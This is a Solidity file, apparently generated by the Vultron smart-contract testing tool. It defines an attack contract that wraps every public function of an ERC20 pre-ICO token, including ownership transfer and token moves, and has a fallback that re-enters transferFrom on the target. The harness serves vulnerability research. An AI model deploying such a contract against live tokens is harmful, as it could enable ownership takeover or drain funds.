pragma solidity ^0.4.19;

import "/home/osboxes/Develop/vultron/contracts/AbabPreICOToken.sol";

contract Attack_AbabPreICOToken5 {

  AbabPreICOToken public target_contract;

  function Attack_AbabPreICOToken5(address _targetContract) public payable {
      target_contract = AbabPreICOToken(_targetContract);
  } 

  function vultron_approve(address _spender, uint256 _amount) public {
    target_contract.approve(_spender, _amount);
  } 

  function vultron_acceptOwnership() public {
    target_contract.acceptOwnership();
  } 

  function vultron_transferOwnership(address _newOwner) public {
    target_contract.transferOwnership(_newOwner);
  } 

  function vultron_ActualizePrice(uint256 _start, uint256 _end, uint256 _buyPrice, uint256 _cap) public {
    target_contract.ActualizePrice(_start, _end, _buyPrice, _cap);
  } 

  function vultron_InitBalanceFrom961e593b36920a767dad75f9fda07723231d9b77(address sender, uint256 val) public {
    target_contract.InitBalanceFrom961e593b36920a767dad75f9fda07723231d9b77(sender, val);
  } 

  function vultron_transfer(address _to, uint256 _amount) public {
    target_contract.transfer(_to, _amount);
  } 

  function vultron_transferFrom(address _from, address _to, uint256 _amount) public {
    target_contract.transferFrom(_from, _to, _amount);
  } 

  function vultron_transferAnyERC20Token(address tokenAddress, uint256 amount) public {
    target_contract.transferAnyERC20Token(tokenAddress, amount);
  } 

  function() public payable {
    target_contract.transferFrom(this,  this,  10000);
  }
} 
